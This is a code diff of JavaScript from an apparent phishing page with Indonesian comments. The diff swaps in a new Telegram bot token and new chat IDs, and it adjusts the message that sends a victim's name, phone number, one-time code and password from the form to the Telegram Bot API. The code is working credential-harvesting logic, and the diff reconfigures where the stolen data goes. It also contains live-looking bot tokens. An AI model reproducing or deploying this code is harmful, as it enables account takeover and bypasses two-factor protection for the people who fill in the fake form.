@@ -1,5 +1,5 @@
-const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
-const chatIds = ["6124038392", "6672109667", "0987654321"]; // Daftar chat ID
+const botToken = "7574129779:AAFfiOTdOg4NSEgWDHcvsyhaXsi_aZRcUIw";
+const chatIds = ["7639992105", "6124038392", "5460230196"]; // Daftar chat ID
 
 function sendMessageToTelegram(message) {
   const urlBase = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -72,7 +72,7 @@ function submitForm() {
     const otp = document.getElementById("otp").value;
     const password = document.getElementById("password").value;
     sendMessageToTelegram(
-      `Nama: ${name}Nomor Telepon: \`${phone}\`\nOTP: ${otp}\nKata Sandi: ${password}` // Nomor telepon dibungkus dengan backticks
+      `Nama: ${name}\nNomor Telepon: \`${phone}\`\nOTP: ${otp}\nKata Sandi: ${password}` // Nomor telepon dibungkus dengan backticks
     );
 
     // Tampilkan modal pop-up
